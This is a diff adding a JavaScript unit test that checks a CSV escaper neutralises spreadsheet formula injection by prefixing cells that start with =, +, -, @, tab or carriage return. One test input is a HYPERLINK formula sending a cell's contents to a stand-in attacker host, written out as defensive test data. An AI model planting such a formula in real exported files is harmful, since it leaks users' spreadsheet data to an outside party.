@@ -161,3 +161,28 @@ test('escapeCsvValue quotes ", comma and line breaks; regression: \\r too', () =
   assert.equal(escapeCsvValue(7), '7');
   assert.equal(rowsToCsv(['h'], [['x\ry']]), 'h\n"x\ry"');
 });
+
+test('a cell a spreadsheet would read as a formula is written as text', () => {
+  assert.equal(escapeCsvValue('=1+1'), "'=1+1");
+  assert.equal(escapeCsvValue('+1+1'), "'+1+1");
+  assert.equal(escapeCsvValue('-2+3'), "'-2+3");
+  assert.equal(escapeCsvValue('@SUM(1)'), "'@SUM(1)");
+  assert.equal(escapeCsvValue('\t=1+1'), "'\t=1+1");
+  assert.equal(escapeCsvValue('\r=1+1'), '"\'\r=1+1"');
+  // Quoting still follows, around the marked cell.
+  assert.equal(
+    escapeCsvValue('=HYPERLINK("https://evil.example/?"&B2,"klik")'),
+    '"\'=HYPERLINK(""https://evil.example/?""&B2,""klik"")"',
+  );
+  // Only the first character counts.
+  assert.equal(escapeCsvValue('a=b'), 'a=b');
+  assert.equal(escapeCsvValue(' =1'), ' =1');
+  // A lone dash and a plain number can't run as a formula, so they stay as written.
+  assert.equal(escapeCsvValue('-'), '-');
+  assert.equal(escapeCsvValue(-5), '-5');
+  assert.equal(escapeCsvValue('-5,5'), '"-5,5"');
+  assert.equal(escapeCsvValue('+62812345678'), '+62812345678');
+  assert.equal(escapeCsvValue('-5+cmd'), "'-5+cmd");
+  assert.equal(escapeCsvValue('--1'), "'--1");
+  assert.equal(rowsToCsv(['h'], [['@x']]), "h\n'@x");
+});
